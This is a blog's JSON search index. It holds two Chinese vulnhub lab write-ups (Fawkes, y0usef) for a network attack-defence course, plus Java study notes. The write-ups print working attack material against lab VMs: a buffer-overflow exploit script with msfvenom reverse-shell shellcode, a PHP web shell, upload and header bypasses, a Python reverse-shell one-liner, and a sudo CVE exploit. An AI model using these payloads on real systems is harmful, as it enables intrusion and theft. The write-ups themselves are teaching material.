{"meta":{"title":"铃的杂货铺","subtitle":"二阶铃图","description":"喜欢夏天的无名之辈","author":"可弟WZ铃号机","url":"http://blog.kekwy.com","root":"/"},"pages":[{"title":"关于","date":"2022-07-31T13:41:20.153Z","updated":"2022-07-31T11:25:31.267Z","comments":false,"path":"about/index.html","permalink":"http://blog.kekwy.com/about/index.html","excerpt":"","text":"喜欢夏天的社畜程序猿，南京大学计算机系本科生，我的世界建筑玩家。 B站: 可弟WZ柒号机 知乎: 可弟岭冬 GitHub: Kekwy 近期计划： 文章：《从继承开始的Java应用笔记》 视频：《我的世界·水星生存指南》 项目：一个3D联机小游戏"},{"title":"404 Not Found","date":"2022-07-30T02:45:25.000Z","updated":"2022-07-30T02:57:34.055Z","comments":true,"path":"404.html","permalink":"http://blog.kekwy.com/404.html","excerpt":"","text":"404"},{"title":"留言板","date":"2022-07-31T13:03:54.437Z","updated":"2022-07-31T13:03:54.437Z","comments":true,"path":"comments/index.html","permalink":"http://blog.kekwy.com/comments/index.html","excerpt":"","text":"也可以是聊天室（"},{"title":"大伙儿","date":"2022-07-30T15:17:01.000Z","updated":"2022-07-31T13:04:48.714Z","comments":false,"path":"friends/index.html","permalink":"http://blog.kekwy.com/friends/index.html","excerpt":"","text":""},{"title":"文章合集","date":"2022-07-31T13:04:10.582Z","updated":"2022-07-31T13:04:10.582Z","comments":true,"path":"categories/index.html","permalink":"http://blog.kekwy.com/categories/index.html","excerpt":"","text":""},{"title":"记录生活","date":"2022-07-31T11:26:11.263Z","updated":"2022-07-31T11:26:11.263Z","comments":false,"path":"recordings/index.html","permalink":"http://blog.kekwy.com/recordings/index.html","excerpt":"","text":"2022七月7.31 网站功能初步竣工，将在使用过程中调整或完善。"}],"posts":[{"title":"【渗透测试】第七周 vulnhub-Fawkes","slug":"vulnhub-Fawkes","date":"2022-11-02T05:21:10.000Z","updated":"2022-11-07T02:59:38.699Z","comments":true,"path":"vulnhub-Fawkes/","link":"","permalink":"http://blog.kekwy.com/vulnhub-Fawkes/","excerpt":"","text":"网络攻防实战 第七次实验 邮箱：&#x6b;&#x65;&#x65;&#x6b;&#x6b;&#101;&#119;&#x79;&#x40;&#x71;&#x71;&#46;&#x63;&#x6f;&#109; 2022年11月2日 靶机连接：https://vulnhub.com/entry/harrypotter-fawkes,686/ 一、实验目的取得目标靶机的root权限并获得三个 flag。 我们将使用到以下攻击手段： 主机发现、端口扫描 FTP匿名登录 edb 调试程序 栈溢出攻击 tcpdump 流量分析 sudo 漏洞提权 二、实验内容 kali: 10.0.2.15 靶机: 10.0.2.11 0x00. 准备工作 获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务： 123$ sudo arp-scan -I eth0 -l$ sudo nmap -p- 10.0.2.11$ sudo nmap -p21,22,80,2222,9898 -sV 10.0.2.11 -A 发现两个比较特殊的端口： 21 - ftp 服务并允许匿名登录获取文件 server_hogwarts； 9898 - 一个自定义的服务。 访问80端口并查看网页源码，发现只有一张图片，并没有其他有价值的信息： 0x01. FTP 匿名登录 查看我们端口扫描获取的信息： 说明该 FTP 服务可以使用用户名 Anonymous 无密码登入并可以查看文件 server_hogwarts。 通过 FTP 登入靶机并使用 get 指令下载上述文件： 12$ ftp 10.0.2.11ftp&gt; get server_hogwarts 查看文件类型，发现是一个 ELF 可执行文件： 1$ file server_hogwarts 给予执行权限，尝试执行： 发现什么都没有输出，但是 shell 阻塞住了并没有退出，说明该程序确实启动了。 查看后台进程： 1$ ps -aux | grep server # 显示名字包含server的所有进程 发现该程序确实创建了后台进程。 查看该进程的连接信息： 1$ ss -pantu | grep server_hogwarts 发现该进程运行在9898端口上，联想到靶机9898端口上的自定义服务，推测该程序即为靶机9898端口上所运行的服务。 使用 nc 命令监听该端口： 发现我们可以进行输入，推测存在栈溢出攻击。 0x02. 栈溢出攻击 使用 checksec 工具查看该文件开启了哪些保护机制： 安装：$ apt install checksec 1$ file server_hogwarts STACK CANARY：在初始化堆栈时在栈底插入一个随机生成的 cookie，在函数返回前调用 __stack_chk_fail 检查 cookie 有没有发生变化，若发生变化则不返回，而直接终止程序。由于缓冲区溢出攻击时往往会覆盖掉 cookie 的值，故该保护机制开启时会导致常规的溢出攻击失效，程序会直接终止而不是跳转至攻击者注入的目标地址。 NX：开启时栈中数据没有执行权限，即攻击者不能通过缓冲区溢出注入攻击代码； PIE：编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定，使程序的内存布局难以预料。 参考：checksec NX、PIE 关闭，我们可以尝试注入反弹 shell 的代码并使其被执行，从而获取反弹 shell。 STACK CANARY 被开启了，意味着注入时我们也许要针对其进行某种绕过，先不管它。 将 kali 本机上的 ALSR 安全机制关闭，该技术会导致地址空间随机化，不便于调试： 1# echo 0 &gt; /proc/sys/kernel/randomize_va_space 使用 edb 对当前程序进行调试，探测注入点： 安装：$ apt install edb-debugger 1$ sudo edb 点击 File-&gt; Attach ： 选择目标进程： 点击运行： 使用 python 生成500个“A”，并在监听窗口进行输入： 1$ python -c &quot;print(500*&#x27;A&#x27;)&quot; 触发报错且看到“0x41414141”，查看此时 EIP 寄存器的值： 发现变成了 0x41414141，而 ‘0x41’ 为 ‘A’ 的十六进制编码，说明我们输入的字符成功覆盖了函数返回地址，导致程序发生了错误跳转。 “诶？不是说这个程序开启了 STACK CANARY 保护机制，会对栈溢出做检查吗？为什么直接注入就成了？” 重新执行上述操作，并重新监听9898端口。点击单步调试： 同样输入500个A， 回到 edb 继续追踪，直到触发错误，记录此时的指令地址： 发现在追踪的过程中没有调用 __stack_chk_fail 函数检查 cookie 的正确性。通过 objdump 查看其反汇编代码进一步确认，发现原来 __stack_chk_fail 只在一部分函数返回前被调用了，而在注入点所在的函数中未被调用，因此我们可以正常进行注入。 综上，Canary found 仅代表程序中存在检查机制，而不一定在所有的ret 语句前都做了检查。在进行渗透测试时应先尝试注入，不要被一些未验证的细节限制了思路。 使用 msf-pattern 工具进行溢出点在输入字符串中位置的探测： 1$ msf-pattern_create -l 500 # 生成长度为500的模式字符串 重新程序并重新开始调试，将生成的模式字符串作为输入： 提示我们此时 EIP 中的值为 0x64413764，即我们输入的字符串中编码为“\\x64\\x41\\x37\\x64”的字串进入了 EIP 中。查找该段编码对应的字符串在模式字符串中的偏移量： 1$ msf-pattern_offset -l 500 -q 64413764 也就是说从模式字符串中的第113个字符串开始造成了栈溢出。 使用 python 生成一段自定义字符串进行验证： 1$ python -c &quot;print(112*&#x27;A&#x27; + &#x27;BBBB&#x27; + 100*&#x27;C&#x27;)&quot; 将生成的字符串输入后，查看 EIP 和栈中的值： 发现第113、114、115、116个字符（“BBBB”）恰好进入 EIP，而其后的字符保留在栈中。 设想将反弹 shell 代码注入栈中，而使程序跳转到栈中执行（jmp esp），即可令靶机上的程序执行反弹 shell 代码生成反弹 shell。 寻找原程序中的 jmp esp 指令，打开 edb 的 Opcode Search： 选择一个可执行段，然后选择搜索 ESP -&gt; EIP： 找到 jmp esp 指令并记录其地址（0x08049d55）： 构造注入字符串： 1$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -b &quot;\\x00&quot; -f py LHOST：改为 kali 的 IP； LPORT：改为监听反弹 shell 的端口号； -b &quot;\\x00&quot;：过滤坏字符（’\\0’），避免输入提前终止。 编写注入脚本： 123456789101112131415161718import struct, socketbuf = b&quot;&quot;buf += b&quot;\\xd9\\xec\\xbe\\xe7\\x1d\\x4c\\x47\\xd9\\x74\\x24\\xf4\\x5f&quot;buf += b&quot;\\x29\\xc9\\xb1\\x12\\x31\\x77\\x17\\x03\\x77\\x17\\x83\\x08&quot;buf += b&quot;\\xe1\\xae\\xb2\\xe7\\xc1\\xd8\\xde\\x54\\xb5\\x75\\x4b\\x58&quot;buf += b&quot;\\xb0\\x9b\\x3b\\x3a\\x0f\\xdb\\xaf\\x9b\\x3f\\xe3\\x02\\x9b&quot;buf += b&quot;\\x09\\x65\\x64\\xf3\\x83\\x95\\x94\\x0c\\xfc\\x97\\x98\\x03&quot;buf += b&quot;\\xa0\\x1e\\x79\\x93\\x3e\\x71\\x2b\\x80\\x0d\\x72\\x42\\xc7&quot;buf += b&quot;\\xbf\\xf5\\x06\\x6f\\x2e\\xd9\\xd5\\x07\\xc6\\x0a\\x35\\xb5&quot;buf += b&quot;\\x7f\\xdc\\xaa\\x6b\\xd3\\x57\\xcd\\x3b\\xd8\\xaa\\x8e&quot;payload = 112 * b&#x27;A&#x27; + struct.pack(&#x27;I&#x27;,0x08049d55) + 32 * b&#x27;\\x90&#x27; + bufs=socket.socket()s.connect((&#x27;10.0.2.11&#x27;,9898))s.send((payload))s.close() 关于上述脚本，我们在栈溢出跳转地址和攻击代码之间加入了一长串空指令 nop（\\x90）。至于为什么一定要加上这一段，我们先看看运行注入代码时发生了什么。 在本地调试时，上述脚本中 connect 的 IP 参数要更改为 127.0.0.1 程序成功跳转到 jmp esp 指令时，观察栈中数据，发现从 08049d55 （我们注入的 jmp esp 指令地址）之后紧接着就是我们加入的32个 \\x90。 接着往下看，当程序运行到 fnstenv [esp - 0xc] 指令时，栈中数据发生了变化，部分空指令被新数据覆盖： 注入代码中存在指令修改了栈顶数据，若不加空指令，我们的注入代码本身就处于栈顶，则会在执行过程中将自身的代码覆盖掉。添加空指令之后，EIP 会沿着空指令一直增长到真正的注入代码，而 ESP 不变，使 EIP 与 ESP 拉开一定的距离，一定程度上保证注入在栈中的代码不会被修改。 故在注入时加入一段空指令可以提高程序稳定性，一般加入的空指令数为4的倍数。 监听 4444 端口，执行上述脚本，获取反弹 shell： 0x03. 信息收集 发现当前用户的主目录下存在隐藏文件： 查看该文件内容： HarrYp0tter@Hogwarts123 疑似某个密码，联想此前靶机上开放的 ssh 端口，尝试通过 ssh 登录靶机。 首先通过22端口登录，发现登录失败；转而通过2222端口登录，发现登录成功： 查看用户权限： 1$ sudo -l 发现当前用户可以不使用密码通过 sudo 执行所有命令。 使用 sudo -i 指令直接提权，并发现 root 账号主目录下存在两个文件： 查看当前环境 IP： 根据 lab2 的经验，我们进入的可能是一个 docker 容器而非靶机本身。 查看此前发现的两个文件： horcrux1.txt：horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ&#x3D;} note.txt： Hello Admin!! We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user. 第一个文件为我们发现的第一个 Flag，第二个文件为一些提示，提示我们需要监听靶机 FTP 服务的流量，即靶机21端口的流量。 0x04. tcpdump 流量分析 使用 tcpdump 命令监听靶机21端口： 1$ tcpdump -i eth0 port 21 等待片刻后发现输出了一些流量记录： 发现其握手信息中包含用户名和密码。 USER：neville PASS：bL!Bsg3k 尝试使用上述用户名和密码通过靶机的22端口登入靶机： 成功登录后，通过 IP 信息发现此时环境为真正的靶机。 查看当前路径下的文件，获取第二个 Flag： horcrux2.txt：horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t} 0x05. sudo 漏洞提权 查看内核与 sudo 版本信息： 上网搜索相关的漏洞信息，最终发现针对当前版本 sudo 的一个漏洞及其利用代码： CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit) 利用代码：https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py 将此处 sudo 的路径更改为靶机上 sudo 的路径： 在 kali 上开启 web 应用，将该文件上传至靶机运行： 成功提权！ 前往靶机的 /root/ 路径，发现第三个 Flag： 三、实验结果 Flag1：horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ&#x3D;} Flag2：horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t} Flag3： root 权限： 四、总结 从端口服务信息中得知靶机 FTP 服务允许匿名登录，尝试匿名登录，通过 get 指令下载文件server_hogwarts，发现是一个可执行文件； 试运行该程序，推测该程序与靶机 9898 端口所运行服务的程序相同； 使用 edb 对该程序进行调试，发现栈溢出攻击注入点，并编写注入脚本，向靶机 9898 端口服务注入反弹 shell 代码； 成功获取反弹 shell，在当前用户主目录的隐藏文件中发现可用于 ssh 登录的密码； 使用 ssh 通过靶机 2222端口登录后，发现位于一个容器中，且当前用户可以直接使用 sudo -i 进行提权。在当前容器 root 用户的主目录中发现第一个 Flag； 使用 tcpdump 监听容器 21 端口的流量，发现 FTP 的握手过程包含了用户名和密码，猜测可以用来通过 ssh 登入靶机。尝试后成功通过22端口进入靶机； 在靶机当前用户的主目录下发现第二个 Flag； 查看发行版本以及 sudo 版本，上网查找相关漏洞，最终找到可用的漏洞利用代码。简单修改后，从 kali 上传靶机，在靶机执行后成功获取 root 权限。 在靶机 root 用户的主目录下，发现最后一个 Flag。","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"【渗透测试】第一周 vulnhub-y0usef","slug":"vulnhub-y0usef","date":"2022-09-27T04:44:31.000Z","updated":"2022-11-06T14:33:08.969Z","comments":true,"path":"vulnhub-y0usef/","link":"","permalink":"http://blog.kekwy.com/vulnhub-y0usef/","excerpt":"","text":"第一周 可弟WZ 主页：blog.kekwy.com 邮箱：&#107;&#x65;&#101;&#x6b;&#107;&#x65;&#119;&#x79;&#x40;&#x71;&#113;&#x2e;&#x63;&#111;&#x6d; 2022年9月27日 一、实验准备靶机：y0usef 下载链接：https://www.vulnhub.com/entry/y0usef-1,624/ 攻击机：kali 二、实验目标取得目标靶机的root权限和2个flag。 三、实验内容 在VirtualBox中同时启动kali攻击机和第三周靶机，并保证两者位于同一局域网下。 在kali中执行以下指令进行局域网主机发现： 1$ sudo arp-scan -I eth0 -l 扫描结果如下： 可以推断1出靶机 地址为 10.0.2.5 。 1： 推断方式很多，可以挨个扫描端口，可以控制变量（不开靶机扫描一次，启动靶机后再扫描一次），可以对比扫描结果与靶机的mac地址，也可以是经验之谈。 在kali中执行以下指令扫描靶机的端口状态： 1$ sudo nmap -p- 10.0.2.5 扫描结果如下： 发现开通了22、80两个端口，提示我们可以考虑靶机上的ssh与http服务。为了进一步确定各端口的用途，我们可以通过以下指令2获取对应的服务版本信息： 1$ sudo nmap -p22,80 -sV -sC 10.0.2.5 2: -p 对指定端口扫描 ​ -sV -sC 默认安全脚本扫描 扫描结果如下： 我们根据靶机开放的80端口，推测可以去网页上寻找突破口。于是在kali中打开浏览器，并输入靶机的IP，进入在靶机上运行的网站，顺便查看网站的源码： 但是发现网站与其源码中均无对我们有帮助的信息，再尝试能否查看靶机上的robots.txt文件3： 但令人遗憾的是，我们并不能查看该文件。 3: Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。obots.txt文件是一个文本文件。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉网络爬虫在服务器上什么文件是可以被查看的。 使用whatweb工具查看web应用所采用的软件构架： 1$ whatweb http://10.0.2.5 尝试使用工具dirsearch爆破 web 服务端的路径，发现一些隐藏的路径和文件： 1$ dirsearch -u http://10.0.2.5 结果如下： 得知4服务器上有三个我们可以访问的文件： 123/adminstration/index.php/index.php/login 其中，通过后两个文件的url进入服务器后的页面与此前相同，仍无有价值信息。 4: HTTP的状态码可分为五大类：1xx-临时响应、2xx-成功、3xx-重定向、4xx-请求错误、5xx-服务器错误。 上述结果中出现的状态码的含义分别为： 状态码 含义 403 (禁止)服务器拒绝请求。 301 (永久移动)请求的网页已永久移动到新位置。服务器返回此响应(对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。 200 (成功)服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。 访问10.0.2.5/adminstration： 提示我们没有权限，需要进行“绕过”。这里我们采用“X系列头部绕过”的方式： 启动Burp Suit并启用拦截，将浏览器代理设置为127.0.0.1:8080（Burp Suit的默认代理端口为8080）。 刷新页面，Burp Suit弹出拦截窗口，在被拦截的数据包中加入X-Forwarded-For: 127.0.0.15（如下图），再将其发送。【后续被拦截的数据包都需要插入上述内容。】 发现成功进入一个登录界面： 这里我们可以直接尝试一下弱口令，用户名和密码都输入admin，发现登入成功了。 5: 让靶机服务器误以为该报文是从其本地发起的，从而获取访问权限。 简单浏览了各个页面之后，发现没有什么直接可用的信息，但是这里的文件上传功能引起了我们的注意。 首先编写一个“一句话木马”的PHP 文件shell.php，内容如下： 1&lt;?php $var=shell_exec($_GET[&#x27;cmd&#x27;]); echo $var?&gt; 尝试直接将其上传，发现网站提示文件被拒绝： 推测网站可能存在针对文件类型的过滤6，我们可以通过修改被拦截的报文中Content-Type字段的值进行绕过： 修改为：image/png： 文件上传成功了，并提供了上传完成的文件的URL。 6: 常见的过滤形式与绕过方法： 针对文件扩展名的绕过： 修改文件扩展名后，再上传。 2)针对文件类型的绕过： 修改报文中的Content-Type字段（如本次实验）。 3)针对文件内容的绕过： 在文件内容的前面添加上符合文件类型要求的数据，中间穿插我们的代码。 通过URL访问文件： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php 进入了一片空白的页面，说明该url正确。再尝试输入指令，测试代码是否可以正常运行： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=ls 指令成功运行，到此为止我们就可以通过url让目标靶机执行反弹shell的代码了。首先，先试探一下靶机的语言环境： 1http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=which python 得到了靶机上的python路径，说明靶机有python环境： 故我们可以利用python版的反弹shell代码实现反弹shell，首先在kali上监听某一个端口（如4444端口）： 1$ nc -nvlp 4444 修改对应的python代码： 1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; 其中ip修改为kali的ip，port修改为刚才设置监听的端口。本次实验中分别为10.0.2.15、4444. 将修改好的代码插入上述URL中对应的参数位置（”cmd&#x3D;”之后），再次访问，发现kali的shell成功监听到靶机的反弹shell： 使用以下指令对反弹shell进行一个简单的升级: 1$ python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot; 查看&#x2F;etc&#x2F;passwd 文件7： 1$ cat /etc/passwd 注意到有以下一项： 1yousef:x:1000:1000:yousef,,,:/home/yousef:/bin/bash 说明有一个叫yousef的用户可以登录系统8，且主目录为/home/yousef。 进入该用户的主目录，发现文件user.txt。查看内容，发现第一个flag。 7: 在Linux系统中的passwd文件中，每一行对应一个用户的一组信息，每项信息用冒号隔开： 1用户名 : 密码 : uid : gid : 用户描述 : 主目录 : 登录shell 8: 对于用户的登录shell： /bin/false 是最严格的禁止login选项，一切服务都不能用， /bin/nologin 只是不允许系统login，可以使用其他ftp等服务 因此我们一眼就锁定了yousef用户（靶机passwd中的大部分用户都不能进行系统登录），而speech-dispatcher、guest-cpxNn2貌似也可以系统登录，但他们的用户名比较奇怪，不作为首选目标，当然也可以都去他们的主目录看一看，结果发现flag在yousef中，还是选择yousef作为突破口。 第一个flag经过base64解码后，得到yousef用户可用于ssh登录的用户名和密码。恰好我们一开始就得知靶机在开放端口22上提供了ssh服务，故我们可以尝试使用ssh登入yousef。 退出反弹shell，在kali的shell使用以下指令： 1$ ssh yousef@10.0.2.5 成功登入yousef后，查看该用户所在的用户组： 1$ id 发现该用户属于sudo组，查看该用户可执行的指令： 1$ sudo -l 发现该用户可以执行所有的系统指令，则我们可以直接切换为root身份： 1$ sudo -i 查看root用户主目录下的文件，发现文件root.txt，查看并使用base64解码得到最后一个flag。 至此我们实现了root权限的提取，并成功获取了所有的两个flag。 【完结撒花】","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"集合类与I/O操作","slug":"javaNotes-3","date":"2022-08-05T00:15:26.000Z","updated":"2022-08-06T15:39:01.691Z","comments":true,"path":"javaNotes-3/","link":"","permalink":"http://blog.kekwy.com/javaNotes-3/","excerpt":"","text":"数组的长度是固定的，集合的长度是可变的。 I. Collection接口 collection 接口时层次结构中的根接口，构成其的单位称为元素。 常用方法： 方法 功能描述 add(E e) 将指定的对象添加到该集合中 remove(Object o) 将指定的对象从该集合中移除 isEmpty() 返回boolean值，用于判断当前集合是否为空 iterator() 返回在此Collection的元素上进行迭代的迭代器，用于遍历集合中的对象 size() 返回int型值，获取该集合中元素的个数 通过迭代器遍历： 1234567import java.util.*;Collection&lt;String&gt; list = new ArrayList&lt;&gt;(); //将List实现类向上转型Iterator&lt;String&gt; it = list.iterator(); //创建迭代器while(it.hasNext()) &#123; //do something String str = (String) it.next();&#125; //遍历 tips：Iterator 的 next() 方法返回的是 Object 。 II. List集合 List集合包括List接口以及List接口的所有实现类； 允许元素重复，元素顺序就是对象的插入顺序； 包含Collection中的所有方法，此外还有如下两个重要方法： get(int index)：获得指定索引位置的元素； set(int index, Object obj)：将集合中指定索引位置的对象修改为指定的对象； 实现类：ArrayList（数组实现）、LinkedList（链表实现）。 III. Set集合 不按特定方式排序，不能包含重复元素，需要小心操作其中的可变对象； 实现类; HashSet：不保证迭代顺序永恒不变； TreeSet：额外实现了 java.util.SortedSet 接口，可以对集合中元素进行排序。 TreeSet 类增加的方法： 方法 功能描述 first() 返回此Set中当前第一个（最低）元素 last() 返回此Set中当前最后一个（最高）元素 comparator() 返回对此set中的元素进行排序的比较亲。如果此Set使用自然顺序，则返回null headSet(E toElement) 返回一个新的Set集合，新集合是 toElement（不包含）之前的所有对象 subSet(E fromElement, E toElement) 返回一个新的Set集合，是fromElement（包含）对象与toElement（不包含）对象之间的所有对象 tailSet(E fromElement) 返回一个新的Set集合，新集合包含对象 fromElement（包含）之后的所有对象 IV. Map集合 一个映射不能包含重复的key，每个key最多只有&#x3D;能映射到一个值。 常用方法： 方法 功能描述 put(K key, V value) 向集合中添加指定的可以呢与value的映射关系 containsKey(Object key) 如果此映射包含指定key的映射关系，则返回true containsValue(Object value) 如果此映射将一个或多个key映射到指定值，则返回true get(Object key) 如果存在指定的key对象，则返回该对象对应的值，否则返回null keySet() 返回该集合中的所有key对象形成的Set集合 values() 返回该集合中所有值对象形成的Collection集合 实现类： HashMap：基于哈希表实现，允许使用null值与null键，不保证顺序。（建议使用） TreeMap：可排序，不允许null键。 V. File类File构造方法 通过完整路径名（包含文件名）： 1File(String pathname); 通过父路径与子路径（包含文件名）： 1File(String parent, String child); 通过父路径对象与子路径（包含文件名）： 1File(File f, String pathname); 文件创建与删除123File file = new File(&quot;word.txt&quot;);file.delete(); //删除文件file.creatNewFile(); //创建文件 常用方法 方法 返回值 说明 getName() String 获取文件名称 canRead() boolean 判断文件是否为可读的 canWrite() boolean 判断文件是否可被写入 exits() boolean 判断文件是否存在 length() long 获取文件的长度（以字节为单位） getAbsolutePath() String 获取文件的绝对路径 getParent() String 获取文件的父路径 isFile() boolean 判断文件是否存在 isDirectory boolean 判断文件是否为一个目录 isHidden() boolean 判断文件是否为隐藏文件 lastModified() long 获取文件最后修改时间","categories":[{"name":"从继承开始的Java应用笔记","slug":"从继承开始的Java应用笔记","permalink":"http://blog.kekwy.com/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://blog.kekwy.com/tags/Java/"},{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"编程","slug":"编程","permalink":"http://blog.kekwy.com/tags/%E7%BC%96%E7%A8%8B/"}],"author":"Ke_DiWZ"},{"title":"类的高级特性与异常处理","slug":"javaNotes-2","date":"2022-08-01T11:50:13.000Z","updated":"2022-08-04T04:25:52.401Z","comments":true,"path":"javaNotes-2/","link":"","permalink":"http://blog.kekwy.com/javaNotes-2/","excerpt":"","text":"I. Java类包 类名冲突： 任何类与接口都需要隶属于某一个类包。可以通过将两个同名类定义在不同的类包中解决类名冲突的问题。 类的路径： 同一个类包中的类相互访问时，可以不指定包名； 同一个包中的类不必存放在同一个位置，只要将CLASSPATH分别指向这两个位置即可。 指定包与导入包： 将 package 表达式作为文件中的第一行非注释代码，java包名必须全部使用小写字母。 1package 包名; 导入包： 123import 包名.*import 包名.类名import 包名.静态方法名 tips: 使用 import 关键字指定一个包中的所有类时，并不会指定这个包的子包中的类，如需使用需要对子包作单独引用。 II. final 关键字 变量： 修饰常量变量； 对象引用被 final 修饰后无法使其指向另一个对象； Java中定义全局变量，通常使用 public static final 修饰，是能在定义时被赋值。 方法： 被 final 修饰的方法不能被重写； private 方法隐式被指定为 final 类型。 类： 被修饰的类不能被继承。 III. 内部类成员内部类 基础用法： 成员内部类的定义：（非内部类不能被声明为private或protected访问类型） 12345public class OuterClass &#123; // 外部类 private class InnerClass &#123; // 内部类 //... &#125;&#125; 内部类中可以访问外部类的所有成员变量和方法，外部类只能通过实例化内部类对象访问内部类成员（受权限修饰关键字限制）； 内部类中的变量与外部类变量同名时，可以使用 this 指针加以区分： 1234// 若内部类与外部类中均有变量xthis.x; // 内部类的xOuterClass.this.x; // 外部类的xx; // 同名局部变量、形参（若有） 在外部类和非静态方法之外实例化内部类对象，需要使用外部类： 12OuterClass out = = new OuterClass();OuterClass.innerClass in = out.new innerClass(); 内部类对象会依赖于外部类对象。只有存在外部类对象，才能实例化内部类对象。 内部类向上转型为接口; 将一个权限修饰符为 private 的内部类向上转型为一个接口，就可以完全隐藏内部类的具体实现过程； 对于一个外部接口中的方法，可以通过在一个类中定义多个内部类，每个内部类分别实现该方法的方式，实现在类中多次实现接口中的同一个方法； 12345678910111213141516171819202122interface OutInterface &#123; public void f();&#125;class OuterClass &#123; // 定义一个外部不可访问的内部类 private class InnerClass implements OutInterface &#123; // 实现接口方法 public void f() &#123; // do something... &#125; &#125; public OutInterface doit &#123; return new InnerClass(); // 将内部类向上转型为外部接口 &#125;&#125;...OuterClass out = new OuterClass();OutInterface outinter = out.doit();outinter.f();... 外部不可直接访问内部类中的 f() 方法但是可以访问接口中的，通过将内部类向上转型执行内部类中定义的方法，对继承外部类的子类隐藏了实现细节。（向外提供外部类和接口） 局部内部类 内部类可以在类的局部位置定义（如方法） 在方法中定义的内部类只能使用方法中被 final 修饰的变量。因为内部类对象的生存期超出方法运行的生存期，导致方法中的一般局部变量比内部类对象的生存期短，而被final型变量被视为常量，其生存期同样比方法运行的生存期长。 匿名内部类123return new A() &#123; ...//内部类体&#125;; 匿名内部类编译以后，产生以“外部类名$序号”为名称的.class文件，序号以1~n排列。 静态内部类 创建静态内部类的对象不需要其外部类的对象； 静态内部类的对象中不能访问非静态外部类的对象。 内部类的继承1234567891011public class OutputInnerClass extends ClassA.ClassB &#123; public OutputInnerClass(classA a) &#123; a.super(); // 生成B类的外部类对象 &#125;&#125;class ClassA &#123; class ClassB &#123; &#125;&#125; IV. 异常捕捉 try-catch 语句： 123456try &#123; // 可以发生异常的代码块&#125;catch(Exception e)&#123; // 异常处理&#125; finally 语句： 无论 try 中的语句是否发生异常，都会执行 finally 中的代码块。finally 不被执行的情况： finally 中发生异常； 之前的代码中使用 System.exit() 退出程序； 程序所在的线程死亡； 关闭CPU。 tips： Exception 是 try 代码传递给 catch 代码块的变量类型； 异常处理常用的函数： getMessage() ：输出错误性质； toString() ：给出异常的类型与性质； printStackTrace() ：指出异常的类型、性质、栈层次及出现在程序中的位置。 V. Java常见异常 异常类 说明 ClassCastException 类型转换异常 ClassNotFoundException 未找到相应类异常 ArithmeticException 算术异常 ArrayIndexOutOfBoundsException 数组下标越界异常 ArrayStoreException 数组中包含不兼容的值抛出的异常 SQLException 操作数据库异常 NullPointerException 空指针异常 NoSuchFieldException 字段未找到异常 NoSuchMethodException 方法未找到异常 NumberFormatException 字符串转换为数字抛出的异常 NegativeArraySizeException 数组元素个数为负数抛出的异常 StringIndexOutOfBoundsException 字符串索引超出范围抛出的异常 IOException 输入输出异常 IllegalAccessException 不允许访问某类异常 InstantiationException 当应用程序试图使用 